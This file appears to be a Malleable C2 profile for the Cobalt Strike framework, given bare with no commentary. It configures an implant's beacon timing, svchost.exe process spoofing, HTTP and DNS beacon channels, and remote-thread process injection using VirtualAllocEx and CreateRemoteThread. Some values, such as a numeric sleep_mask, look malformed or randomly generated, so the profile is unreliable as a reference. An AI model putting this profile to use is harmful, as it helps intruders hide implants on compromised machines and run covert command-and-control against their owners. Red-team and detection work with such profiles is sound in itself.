set sleeptime "55640";
set jitter "43";
set spawnto_x86 "%windir%\syswow64\svchost.exe";
set spawnto_x64 "%windir%\sysnative\svchost.exe";

http-get {
    set uri "/RELEASES.css";
    set verb "GET";
}

http-post {
    set verb "POST";
}

stage {
    set cleanup "1";
    set sleep_mask "155365";
}

process-inject {
    set startrwx "false";
    set userwx "false";
    set min_alloc "6796";

    transform-x86 {
        append "\x90\x90\x90\x90\x90";
    }

    transform-x64 {
        append "\x90\x90\x90\x90\x90";
    }

    execute {
        CreateThread;
        RtlCreateUserThread;
        CreateRemoteThread;
    }
    set allocator "VirtualAllocEx";
}

dns-beacon {
    set maxdns "251";
    set dns_idle "19.7.91.241";
    set dns_sleep "145";
    set beacon "smtp.";
    set get_A "up.";
    set get_AAAA "box.";
    set get_TXT "lantern.";
    set put_metadata "test.";
    set put_output "answer.";
}
